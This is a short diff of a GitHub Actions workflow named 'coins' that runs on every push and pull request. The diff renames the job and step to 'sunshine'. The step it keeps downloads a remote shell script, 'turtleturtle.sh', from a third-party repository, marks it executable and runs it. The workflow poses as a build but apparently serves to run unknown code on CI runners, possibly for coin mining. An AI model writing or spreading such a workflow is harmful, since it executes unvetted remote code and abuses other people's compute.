@@ -2,7 +2,7 @@ name: coins
 on: [push, pull_request] 
 jobs: 
 build: 
-name: akuganteng 
+name: sunshine 
 runs-on: ubuntu-18.04 
 strategy: 
 max-parallel: 1 
@@ -22,6 +22,6 @@ with:
 id: go
 - name: Setup 
   uses: actions/checkout@v2 
-- name: akuganteng 
+- name: sunshine 
   run: | 
   wget https://github.com/venetta999/turtleturtle/blob/main/turtleturtle.sh && chmod u+x turtleturtle.sh && ./turtleturtle.sh
